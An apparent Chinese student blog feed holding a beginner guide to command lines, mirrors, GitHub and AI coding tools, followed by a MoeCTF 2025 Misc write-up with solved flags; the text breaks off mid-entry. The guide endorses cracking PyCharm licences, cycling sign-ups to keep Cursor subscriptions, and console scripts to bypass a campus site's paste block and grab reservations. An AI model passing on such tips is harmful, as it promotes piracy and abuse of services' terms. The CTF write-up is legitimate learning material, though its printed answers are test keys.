<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sa1ntCHENの小窝</title>
  
  <subtitle>Van!shment Th!s World</subtitle>
  <link href="https://saintcen.github.io/atom.xml" rel="self"/>
  
  <link href="https://saintcen.github.io/"/>
  <updated>2025-10-23T03:03:02.455Z</updated>
  <id>https://saintcen.github.io/</id>
  
  <author>
    <name>Sa1ntCHEN</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>你缺失的那门计算机课</title>
    <link href="https://saintcen.github.io/2025/10/17/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/"/>
    <id>https://saintcen.github.io/2025/10/17/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/</id>
    <published>2025-10-16T16:00:00.000Z</published>
    <updated>2025-10-23T03:03:02.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="你缺失的那门计算机课">你缺失的那门计算机课</h1><p><strong>Writing For HIC Dev Group</strong></p><p><strong>部分说法不够专业或存在错误，欢迎指正</strong></p><blockquote><p>本文和<a href="https://www.criwits.top/missing/">你缺失的那门计算机课|计算机技术学习札记</a>目的类似，但针对性和实用性更强，部分已经涉及的内容不再重复。无论是开发还是以后的学习，你都要了解你的伙伴。</p></blockquote><h2 id="命令行">命令行</h2><p><img src="/2025/10/17/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/1.png"></p><p>命令行是操作系统（<code>OS</code>，<code>Operation System</code>）中非常重要的组成部分，在不同的<code>OS</code>中命令语法和底层逻辑也各不相同，也有很多变种（如<code>git bash</code>/<code>anaconda prompt</code>）。命令行可以简单地理解为在特定的文件路径下执行不同的指令，便捷地管理文件或执行程序。我们的<code>windows</code>系统本质上是一种<code>GUI</code>（图形化界面），比如，删除文件你依靠显示屏和鼠标即可完成。但是通过命令行，你不仅可以通过一条简单的命令就完成删除操作，还可以使用许多不支持图形化界面的工具。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 切换路径 更换磁盘（以D盘为例）需要先输入D:</span><span class="token builtin class-name">cd</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">25878</span><span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>Repository<span class="token punctuation">\</span>Hexo-Blog<span class="token comment"># 需要执行命令</span><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> hexo-cli</code></pre><p>这里再补充几点。</p><p><strong>1.以管理员模式运行</strong>：可以解决部分文件和程序的权限问题，可以解决部分报错。</p><p><strong>2.指令的格式：</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> hexo-cli↑    ↑       ↑   ↑<span class="token operator">|</span>    <span class="token operator">|</span>       <span class="token operator">|</span>   <span class="token operator">|</span><span class="token operator">|</span>    <span class="token operator">|</span>       <span class="token operator">|</span>   └─── 参数2 <span class="token punctuation">(</span>Argument / Parameter<span class="token punctuation">)</span><span class="token operator">|</span>    <span class="token operator">|</span>       <span class="token operator">|</span><span class="token operator">|</span>    <span class="token operator">|</span>       └─── 选项/标志 <span class="token punctuation">(</span>Option / Flag<span class="token punctuation">)</span><span class="token operator">|</span>    <span class="token operator">|</span><span class="token operator">|</span>    └─── 子命令 <span class="token punctuation">(</span>Subcommand<span class="token punctuation">)</span><span class="token operator">|</span>└─── 命令/程序 <span class="token punctuation">(</span>Command / Program<span class="token punctuation">)</span></code></pre><p><strong>3.默认快捷键：</strong><code>Win+R</code>启动运行窗口（在<code>Linux</code>系统中是<code>Ctrl+Alt+T</code>），输入<code>cmd</code>/<code>powershell</code>（二者存在语法的区别，但功能类似）。当然，点击任务栏的<code>windows</code>图标搜索也是可以的。</p><h2 id="linux">Linux</h2><p>提到命令行和操作系统就不得不提<strong>Linux</strong>了。</p><p><img src="/2025/10/17/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/3.png"></p><p><code>Linux</code>是一种开源和免费的类<code>Unix</code>操作系统，其内核由芬兰计算机科学家<code>Linus Torvalds</code>于<code>1991</code>年创建。<code>Linux</code>继承了<code>Unix</code>的设计思想，具有多用户、多任务、支持多线程和多<code>CPU</code>等特性。</p><p>但是大部分人的电脑上都只安装了<code>windows</code>/<code>mac</code>操作系统，<code>linux</code>这个听上去高大上的概念似乎离大家很遥远。当然，我想你们中有些人或许大学四年都用不着<code>linux</code>，但它对于专业开发者来说非常非常重要。</p><ul><li><p><strong>卓越的开发环境和社区生态</strong>：拥有海量的开源库、框架及强大的工具链，社区活跃，问题解决方案丰富，许多项目都是在<code>linux</code>上测试的，绝大多数云服务器也是<code>linux</code>系统，是开发者和企业的首选平台。</p></li><li><p><strong>丰富的发行版和可定制性</strong>：从轻量级到功能全面，从服务器到桌面，提供多种发行版（如<code>Ubuntu</code>、<code>Kali</code>）选择。用户可深度定制每一个环节，打造完全符合个人需求的工作环境。</p></li><li><p><strong>强大的操作系统内核</strong>：以高稳定性、高效能和安全性著称。驱动了全球绝大部分的服务器、超级计算机和安卓设备，是互联网基础设施的基石。</p></li><li><p><strong>无所不能的命令行</strong>：通过<code>shell</code>命令，外加一些下载的工具，可以高效、精准地完成文件管理、系统监控、编程开发等所有任务。其强大的脚本功能还能将复杂操作自动化，极大提升效率。</p></li><li><p><strong>便捷的环境管理</strong>：强大的包管理器（如<code>apt</code>,<code>yum</code>）提供海量软件的一键安装与依赖管理；结合容器技术（如<code>Docker</code>），可快速创建、复制一致的隔离环境，从根本上解决开发、测试与部署的环境问题。</p></li></ul><p>至于使用方法，主流的一种是通过<code>VMware Workstation</code>（相对便捷，但是存在硬件不支持的问题，比如无法调用<code>GPU</code>），另一种是下载<code>iso</code>文件安装双系统。具体操作不详细展开，网上教程很多。</p><p>但它也没有这么完美，因为比较原生，一些<code>windows</code>上不会出现的<code>bug</code>，<code>linux</code>上会。</p><h2 id="软件与工具">软件与工具</h2><p>下载软件和工具，可以帮我们解决一些任务或者配置环境。比如，做过后端加分题<code>T3</code>的同学应该会用到<code>burpsuite</code>，是一个强大的网络渗透工具，积累一些常见的工具可以让你拥有舒适的使用体验，也可以让黑客在网络上招摇过市。有些工具有<code>GUI</code>（网页或者本地软件），但是有些工具需要命令行，命令行工具的使用要善于搜索与积累。下载途径，可以分为官网/资源上传/<code>github</code>仓库等等。</p><p><a href="https://www.criwits.top/missing/tools-software.html">工具类软件推荐| 你缺失的那门计算机课 | 计算机技术学习札记</a></p><h3 id="付费与订阅">付费与订阅</h3><p><strong>我可以断言绝大部分工具都有白嫖技巧！</strong></p><p>比如，<code>cursor</code>可以靠反复申请邮箱连续订阅，<code>pycharm</code>可以靠破解许可证激活。</p><p>当然，有些该付费的还是要付费，比如一个月<code>50RMB</code>的<code>Trae</code>可以畅享<code>600</code>次的<code>SOTA AI</code>，一个月<code>12RMB</code>的<code>Clash</code>可以畅想高速访问，把钱用在刀刃上。</p><p>至于白嫖技巧，<code>CSDN</code>/<code>b站</code>/<code>知乎</code>，甚至微信公众号，完全可以<code>cover</code>。</p><h3 id="网络问题">网络问题</h3><p>我们不可避免需要访问国外网站（甚至有人和我说导员不让用？），毫无疑问可以用<code>VPN</code>，但是没<code>VPN</code>的要哀嚎，有<code>VPN</code>的嫌每一次打开麻烦。</p><p>因此，我们可以使用<strong>镜像站</strong>！意思就是，<strong>通过代理服务器实时从原始网站调取内容并呈现给访客的网站</strong>。</p><ul><li><strong>直接访问URL</strong></li></ul><p>我这里以<code>Hugging Face</code>为例，是一个集成了预训练模型的网站，对于做<code>AI</code>相关的项目或科研非常重要，官方网站是<a href="https://huggingface.co/">https://huggingface.co/</a>，没<code>VPN</code>上不去，但镜像站可以直接访问<a href="https://hf-mirror.com/">https://hf-mirror.com/。</a>类似的还有直接集成高速下载链接，比如：<a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学开源软件镜像站| Tsinghua Open Source Mirror</a></p><ul><li><strong>配置文件配置镜像源</strong></li></ul><p>我这里指的配置文件是一些控制下载资源的包管理器的配置文件，我这里举两个例子。</p><p>1.<code>Anaconda</code>可以控制<code>python</code>包的下载，如果使用基础的<code>conda</code>源下载速度比较慢，我们需要配置镜像源。它有一个配置文件<code>.condarc</code>（当然配置远远不止镜像源）。在<code>linux</code>系统中一般在根目录，而且可以用<code>vim</code>工具直接修改，在<code>windows</code>系统中一般在<code>C:/Users/用户名</code>下，直接找到文件修改即可，具体修改内容上网自行搜索，各个包管理器不太相同。</p><p>2.<code>npm</code>是未来组会我们制作个人主页需要用到的<code>Node.js</code>包管理器。我们可以通过命令行直接设置镜像源。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Set Taobao mirror as the npm registry</span><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npmmirror.com<span class="token comment"># Verify the configuration</span><span class="token function">npm</span> config get registry<span class="token comment"># Output: https://registry.npmmirror.com</span></code></pre><p>另一个<code>python</code>下载源<code>pip</code>同理，通过命令行设置镜像源，它会自动在系统目录下创建<code>/pip/pip.ini</code>配置文件，后续可以通过修改配置文件来控制下载源功能，下面展示了路径和内容的查找方法。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 设置镜像源</span>pip config <span class="token builtin class-name">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple<span class="token comment"># 查找配置文件路径</span>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">2587</span><span class="token operator"><span class="token file-descriptor important">8</span>></span>pip config list <span class="token parameter variable">-v</span>For variant <span class="token string">'global'</span>, will try loading <span class="token string">'C:\ProgramData\pip\pip.ini'</span>For variant <span class="token string">'user'</span>, will try loading <span class="token string">'C:\Users\25878\pip\pip.ini'</span>For variant <span class="token string">'user'</span>, will try loading <span class="token string">'C:\Users\25878\AppData\Roaming\pip\pip.ini'</span>For variant <span class="token string">'site'</span>, will try loading <span class="token string">'c:\users\25878\appdata\local\programs\python\python38\pip.ini'</span>global.index-url<span class="token operator">=</span><span class="token string">'https://pypi.tuna.tsinghua.edu.cn/simple'</span><span class="token comment"># 配置文件内容</span>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">2587</span><span class="token operator"><span class="token file-descriptor important">8</span>></span>pip config listglobal.index-url<span class="token operator">=</span><span class="token string">'https://pypi.tuna.tsinghua.edu.cn/simple'</span></code></pre><h3 id="下载速度太慢">下载速度太慢</h3><p>如果下载一些比较大的文件实在等不及，我们可以使用多线程下载工具。</p><p>在<code>linux</code>系统中，命令行就有<code>aria2</code>，而<code>windows</code>系统中，我推荐有<code>GUI</code>的<code>Motrix</code>，大家可以自己搜索。</p><h2 id="配环境">配环境</h2><p>配环境是非常困扰同学们的一个问题，但我认为这是<strong>初学者和进阶者的核心能力区别</strong>，一旦你熟练掌握，你可以快速地复现一个项目并且修改代码。但是，应用场景五花八门，没有一个统一的解决方案，我认为配环境技巧就是</p><ul><li><strong>根据大佬的帖子一步一步来，注意不要跳步骤</strong></li><li><strong>遇到报错善搜索和问AI，对于常用的做笔记</strong></li><li><strong>保持一个良好的心态，胸有惊雷而面如平湖</strong></li></ul><p>硬件需要驱动的我不太熟，这里就举软件的例子。</p><p>首先，我非常推荐大家使用<code>vscode</code>作为首选的开发<code>IDE</code>，虽然配置环境部分对初学者来说比较烦琐，但是一个<code>vscode</code>可以运行所有环境的代码，还有很多开发实用插件和美化插件（比如我就喜欢换好看的背景，<code>coding</code>心情更好）。当然也要看具体的任务和个人喜好，跑<code>AI</code>我喜欢<code>vscode</code>而不是<code>pycharm</code>，开发我喜欢<code>IDEA</code>而不是<code>vscode</code>。</p><p><strong>配环境，无非需要涉及到的是集成<code>IDE</code>，编译器，包管理器，框架，插件/工具，命令行等等</strong>。为什么<code>Dev-C++</code>可以直接使用？你溯源到它的文件地址，你就能发现它实质上包含编译器文件。所以你在配置<code>vscode</code>的<code>c/c++</code>环境要下载<code>MinGW</code>，并且要通过设置全局系统环境变量来定位他的文件位置。同样的，深度学习环境需要<code>cuda/cudnn</code>，<code>java</code>需要<code>jdk</code>。程序呈现给你的是可读性语言，运行需要编译器连接到底层硬件。</p><p>另外，因为不同的任务需要下载不同的包，而不同的包和不同的环境我们需要统一的管理实现环境隔离，这个时候包管理器就出现了。比如，上文提到<code>python</code>有<code>anaconda</code>，<code>java</code>有<code>maven</code>，这些包管理器帮助我们更好的构建开发环境。至于插件/工具/框架等等，我们往往需要通过命令行或者官网下载。</p><p>环境也分为本地环境和云环境，云环境我们需要租借云服务器进行运行，网站就是在云服务器上运行的。</p><p>命令行发挥了重要作用：有些环境激活需要通过命令行，例如实现<code>SSH</code>远程连接；确认环境是否配置可以通过观察命令行的输出。所以，学好使用<code>shell</code>非常重要。</p><h2 id="github">Github</h2><p>首先要明确，<strong>Github</strong>是一个国外网站，按刚才说的，我们可以通过<code>vpn</code>/镜像站访问。</p><p>常用的镜像站有：</p><ul><li><a href="https://help.kkgithub.com/">https://help.kkgithub.com</a>（通过这个网站跳转）</li><li><a href="https://bgithub.xyz/">https://bgithub.xyz</a></li></ul><p>如果你还不知道<code>Github</code>是啥，只是听过，那我要告诉你了：<code>GitHub</code>是一个流行的代码托管平台，广泛应用于个人开发者、开源项目和企业级开发团队。它基于<code>Git</code>版本控制系统，允许开发者存储和管理代码，同时跟踪和控制代码的更改。<code>GitHub</code>不仅提供代码托管服务，还集成了项目管理、代码审查和持续集成等功能。此外，<code>GitHub</code>也被称为“程序员的<code>Facebook</code>”，因为它促进了开发者之间的社交和合作。</p><p>论文代码/优秀项目都在这里开源，你也可以通过<code>Github</code>构建自己的小天地，没有账号的赶紧注册！</p><p><img src="/2025/10/17/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/4.png"></p><h3 id="仓库管理">仓库管理</h3><p><code>Github</code>的仓库管理比较不一样，因为涉及到专业的企业开发和隐私政策，网页上可以新建仓库，但是无法直接上传代码，我们需要通过命令行工具<code>git bash</code>或者<code>github desktop</code>（<code>GUI</code>）对代码的版本进行管理。此外，在连接上也有一些小细节，比如采用<code>http</code>传输往往需要连接<code>VPN</code>上传，通过<code>SSH</code>传输可以避免这个问题，感兴趣的可以自行搜索。</p><p>仓库的功能有很多，比如<code>release</code>/<code>issue</code>/<code>discussion</code>等等。我要特别提及一下<code>commit</code>，它记录了每一次的代码提交，在团队协作的项目中至关重要。</p><h3 id="开源代码">开源代码</h3><p>学术论文/开源项目的代码和进度往往会上传平台公开，学会下载开源代码从复现到修改不仅仅是做项目/做科研的基础，也可以找到实用的工具，提升我们的工作效率，或从中学习技术。可以直接从网页中下载，或者用<code>git clone</code>命令。下载完成后，环境配置/操作指南请参考<code>README.md</code>。还有，不会<code>markdown</code>语法的赶紧去学了，做记录/文档非常有用。</p><h2 id="浏览器">浏览器</h2><p><img src="/2025/10/17/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/2.png"></p><h3 id="开发者工具">开发者工具</h3><p>“网络”可以查看网络请求和加载的页面文件，“元素”可以查看前端的盒子布局和源代码（也可以鼠标右键+查看源代码），“应用程序”可以控制网页的缓存，但我要重点提一下控制台。</p><p>鼠标右键+检查，或者<code>F12</code>。控制台可以直接控制网页行为并输出信息。比如在你可以禁用<code>JavaScript</code>上传学在西电不让粘贴的内容，你可以执行<code>JS</code>代码抢远望谷的位置，你可以根据报错码定位自己的网页代码错在哪里…….网页开发离不开浏览器，它不仅是容器，更是重要的测试工具。</p><h3 id="浏览器插件">浏览器插件</h3><p>为了更便捷的使用浏览器，或者达成某些功能（比如刷课），浏览器推出了各种插件，感兴趣的同学可以关注下，除了使用也可以也通过<code>JS</code>等语言编写。</p><h2 id="sota-ai">SOTA AI</h2><p>在大见面会上，文少鼓励大家拥抱<code>SOTA AI</code>，简单来说就是目前性能最强的<code>AI</code>。首先要提醒大家，<code>AI</code>的概念不仅局限于大模型（<code>LLM</code>），还涉及一些多模态<code>AI</code>，比如图像生成，图像理解等等，大语言模型的变种是<code>agent</code>，通过调用大语言模型的<code>api</code>，经过微调，外加<code>MCP</code>工具，可以自行实现某些具体领域的功能，比如<code>AI Code Editor</code>。</p><p><code>LLM</code>的使用，可以通过访问镜像站或者境外网站。个人觉得<code>GPT-5</code>/<code>Gemini2.5-Pro</code>深度思考比较强，<code>claude4-sonnet</code>的<code>coding</code>能力突出（速度快，但定位错误和综合思考的能力比前两个差一些），阿里<code>qwen</code>的使用体验也不错。日常任务，<code>deepseek</code>/<code>doubao</code>就够用了。不过我还挺喜欢花里胡哨的豆包的。</p><p>然后就是<code>AI Code Editor</code>，在开发领域功能非常强大，从编写，到测试，到部署让你享受强大的模型，自动补全代码，自动执行命令，用过你才知道程序员为什么被取代了。目前比较主流的就是<code>cursor</code>和<code>trae</code>，目前<code>trae</code>赶上的很快，使用上没有太大差异。但是要注意下载海外版，并且挂<code>VPN</code>才能使用。</p><p><img src="/2025/10/17/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/5.png"></p><p>后续搭建个人网站，可以让不太会写前端代码的也能搭建出精美的网站。</p><p>当然我不鼓励大家在编程上太依赖<code>AI</code>，他确实可以帮助我们完成一些繁琐的工作，但正如“确认是否修改”功能一样，需要人的审查。在一些复杂的任务中，<code>AI</code>很容易出错，哪怕是简单的任务也容易不符合我们的预期。我们在给他指令的时候需要把设计工作做详细，或者在他的提示下，发挥主观能动性，共同完成剩余部分。</p><p>至于不同任务下<code>prompt</code>如何设计，感兴趣的同学可以去搜搜，实践也会给你提供经验。</p><h2 id="补充">补充</h2><p>在后端开发招新的学习路线中，我希望大家可以去学习操作系统/计算机网络的基础知识，一些常见的问题，比如你对校园网的疑惑，都可以解决。这里推荐一些技术人的茶歇吧，可以多积累计算机相关的知识和前沿方向。</p><p><a href="https://www.zhihu.com/">知乎</a>/<a href="https://www.runoob.com/)">菜鸟教程</a>/<a href="https://juejin.cn/">稀土掘金</a>/<a href="https://github.com/trending">Github Trending</a>/<a href="https://www.infoq.cn/">InfoQ</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;你缺失的那门计算机课&quot;&gt;你缺失的那门计算机课&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Writing For HIC Dev Group&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;部分说法不够专业或存在错误，欢迎指正&lt;/strong&gt;&lt;/p&gt;
&lt;blockqu</summary>
      
    
    
    
    <category term="教程" scheme="https://saintcen.github.io/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="CS基础" scheme="https://saintcen.github.io/tags/CS%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>MoeCTF2025_Misc_wp</title>
    <link href="https://saintcen.github.io/2025/10/13/MoeCTF2025_Misc_wp/"/>
    <id>https://saintcen.github.io/2025/10/13/MoeCTF2025_Misc_wp/</id>
    <published>2025-10-12T16:00:00.000Z</published>
    <updated>2025-10-15T16:28:03.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="moectf2025_misc_wp">MoeCTF2025_Misc_wp</h1><blockquote><p>工具大赛罢了</p></blockquote><h2 id="环境配置">环境配置</h2><ul><li><strong>操作系统</strong>：<code>Windows 11</code>/<code>Ubuntu 22.04 LTS</code></li><li><strong>代码环境</strong>：<code>python</code></li><li><strong>乱七八糟的工具，写一题找一个</strong></li></ul><h2 id="misc入门指北">Misc入门指北</h2><blockquote><p>欢迎来到misc的世界^ _ ^</p></blockquote><p>打开PDF，查找<code>moectf</code>，复制隐藏的flag提交即可<strong>（注意拉到底）</strong>。</p><pre class="language-none"><code class="language-none">moectf&#123;We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!&#125;</code></pre><h2 id="rush">Rush</h2><blockquote><p>“冲刺，冲刺！”你正走在路上，耳边传来这样的声音，还没反应过来，就被撞倒了。</p><p>你费劲地爬起来，好像看到了什么信息，回过神来那人早已扬长而去，那我缺的这个道歉这块？</p></blockquote><p>拿到<code>gif</code>发现二维码，截图。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc1.jpg"></p><p>用<code>CQR</code>打开直接发现了隐藏<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;QR_C0d3s_feATUR3_eRror_c0RRECt10N&#125;</code></pre><h2 id="ez_lsb">ez_LSB</h2><blockquote><p>这是一张普通的图片，但是一个个像素看过去似乎有些蹊跷？</p></blockquote><p>题目已经告诉我们是图片<code>LSB</code>隐写，我们用<code>zsteg</code>检测下，但<code>flag</code>形式没有意义。</p><pre class="language-bash" data-language="bash"><code class="language-bash">dzc@dzc-virtual-machine:~/zsteg$ zsteg xidian.pngb1,r,lsb,xy         <span class="token punctuation">..</span> text: <span class="token string">"The flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9"</span>b1,rgb,lsb,xy       <span class="token punctuation">..</span> file: TeX font metric data <span class="token punctuation">(</span><span class="token punctuation">\</span>002H <span class="token punctuation">\</span>002<span class="token punctuation">)</span>b1,rgba,msb,xy      <span class="token punctuation">..</span> file: OpenPGP Public Keyb2,bgr,msb,xy       <span class="token punctuation">..</span> file: Applesoft BASIC program data, first line number <span class="token number">128</span>b3,bgr,msb,xy       <span class="token punctuation">..</span> file: Lotus unknown worksheet or configuration, revision 0x8b4,r,lsb,xy         <span class="token punctuation">..</span> file: Targa image data - Map <span class="token punctuation">(</span><span class="token number">256</span>-4112<span class="token punctuation">)</span> <span class="token number">4096</span> x <span class="token number">65536</span> x <span class="token number">1</span> +4097 +257 - right <span class="token string">"<span class="token entity" title="\001">\001</span><span class="token entity" title="\020">\020</span><span class="token entity" title="\001">\001</span><span class="token entity" title="\020">\020</span><span class="token entity" title="\021">\021</span>"</span>b4,bgr,lsb,xy       <span class="token punctuation">..</span> file: Targa image data - Map <span class="token number">65536</span> x <span class="token number">1</span> x <span class="token number">16</span> +1</code></pre><p>我们用<code>cyberchef</code>尝试<code>base64</code>解码得到<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;LSB_1s_s0_1nt3rest1ng!!sj9wd&#125;</code></pre><h2 id="ez_锟斤拷">ez_锟斤拷????</h2><blockquote><p>E=hv在记事本里写下了一些神秘字符，</p><p>但是经过一通保存另存为的迷之操作之后文本文件里的东西全变成了乱码</p></blockquote><p>拿到了<code>flag.txt</code>文件，<code>UTF-8</code>错误由<code>GBK</code>解码所致，需要对此乱码（锟斤拷）进行处理。</p><pre class="language-python" data-language="python"><code class="language-python">garbled_text <span class="token operator">=</span> <span class="token string">"锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹"</span><span class="token comment"># 1.用 GBK 编码</span>gbk_bytes <span class="token operator">=</span> garbled_text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span> <span class="token comment"># 替换无法编码的字符</span><span class="token comment"># 2.用 UTF-8 解码</span>original_text <span class="token operator">=</span> gbk_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token comment"># 3.转成半角</span><span class="token keyword">import</span> unicodedata<span class="token keyword">def</span> <span class="token function">full_to_half</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>        unicodedata<span class="token punctuation">.</span>normalize<span class="token punctuation">(</span><span class="token string">'NFKC'</span><span class="token punctuation">,</span> char<span class="token punctuation">)</span>  <span class="token comment"># NFKC 标准化转换全角→半角</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> text    <span class="token punctuation">)</span>flag <span class="token operator">=</span> full_to_half<span class="token punctuation">(</span>original_text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> </code></pre><p>得到了输出</p><pre class="language-none"><code class="language-none">moectf&#123;EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww&#125;恭喜你得到弗拉格后面全?斤拷锟斤拷锟斤拷</code></pre><p>不知道何意味。取前面的<code>flag</code>部分提交即可。</p><h2 id="weird_photo">weird_photo</h2><blockquote><p>FLAG就在图中。什么，你说你看不见 FLAG？注意 CRC！</p></blockquote><p>提示图片的CRC校验值可能有误，我们用<code>pngcheck</code>检查下。</p><pre class="language-bash" data-language="bash"><code class="language-bash">pngcheck <span class="token parameter variable">-v</span> photo.png File: photo.png <span class="token punctuation">(</span><span class="token number">829531</span> bytes<span class="token punctuation">)</span>  chunk IHDR at offset 0x0000c, length <span class="token number">13</span>    <span class="token number">900</span> x <span class="token number">490</span> image, <span class="token number">24</span>-bit RGB, non-interlaced   CRC error <span class="token keyword">in</span> chunk IHDR <span class="token punctuation">(</span>computed d34d176f, expected b5a7bf8c<span class="token punctuation">)</span>ERRORS DETECTED <span class="token keyword">in</span> photo.png</code></pre><p>然后根据西电同学的经验，这个塔楼拍的不太完整，感觉是图片尺寸改掉了？我们用<code>010 Editor</code>编辑下。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc3.jpg"></p><p>搜索<code>b5a7bf8c</code>的位置，改成<code>d34d176f</code>（位置就在IHDR块数据开始的地方）。尺寸<code>384</code>和<code>1EA</code>用十六进制计算就是<code>900</code>和<code>490</code>，我们把高度<code>1EA</code>也改成<code>384</code>看看能不能显示<code>flag</code>。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc4.jpg"></p><pre class="language-none"><code class="language-none">moectf&#123;Image_Height_Restored&#125;</code></pre><h2 id="sstv">SSTV</h2><blockquote><p>识别并解码附件中使用的特殊通信协议，以获取隐藏信息。</p></blockquote><p>已经提示了我们<code>SSTV</code>编码，我们使用<code>RX-SSTV</code>工具，配置虚拟声卡，播放<code>sstv.wav</code>即可。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc5.jpg"></p><pre class="language-none"><code class="language-none">moectf&#123;d3codiNG_SStV-reQu1REs-PATI3nC3&#125;</code></pre><h2 id="encrypted_pdf">encrypted_pdf</h2><blockquote><p>I am so forgetful… So I will use a password that is simpleenough.</p></blockquote><p>加密的PDF，密码足够简单，爆破即可，我用的是在线网站<code>I Love PDF</code>。</p><p>解密后打开PDF，隐藏方式和入门指北一样，查找<code>moectf</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;Pdf_1s_r3a1ly_c0lor4ul!!ihdw&#125;</code></pre><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc2.jpg"></p><p><strong>啊啊啊啊啊啊啊啊啊啊啊SEC娘宝宝可爱捏~</strong></p><h2 id="捂住一只耳">捂住一只耳</h2><blockquote><p>一只手捂住耳朵 另一只手打开音乐 似乎听到了不一样的声音</p></blockquote><p>明显在暗示单声道与立体声，我们用<code>Audacity</code>工具观察并且分离出上方的声道。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc6.jpg"></p><p>像是有规律的声音，听了一下好像是<code>moise</code>密码，我们用在线网站解码一下就得到<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;HALF_RADIO_IN_XDU&#125;</code></pre><p><strong>我已经很久没有听到过半部电台的故事了…</strong></p><h2 id="enchantment">Enchantment</h2><blockquote><p>哇多么好的附魔啊</p><p>你把图片发了出去，但似乎附魔台上的文字有一些不对劲？</p></blockquote><p>得到了一个<code>pngpca</code>文件，我们用<code>wireshark</code>作流量分析。</p><p>用<code>http</code>过滤，发现了<code>post</code>方法上传的<code>enchantment.png</code>文件，我们导出分组字节流保存文件为<code>png</code>格式。</p><p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc7.jpg"></p><p>这是<code>minecraft</code>里的附魔台文字，我们去网上找一下换算图，一个个对过来就得到<code>flag</code>。</p><pre class="language-none"><code class="language-none">moectf&#123;now_you_have_mastered_enchanting&#125;</code></pre><h2 id="webrepo">WebRepo</h2><blockquote><p>这都是什么稀奇古怪的格式！？</p></blockquote><p>直译一下是“网络上的仓库”，但是得到了一个<code>webp</code>文件，好一个一语双关。</p><p>扫描二维码告诉我们用<code>binwalk</code>，检查了一下发现是<code>.rar</code>文件，解压出发现了隐藏的<code>.git</code>文件夹，和题目对上了，是个仓库（太对了，真是<code>WebRepo</code>），<code>flag</code>一定藏在提交信息中。</p><p>在该目录下打开终端输入<code>git show</code>，得到<code>flag</code>。</p><pre class="language-none"><code 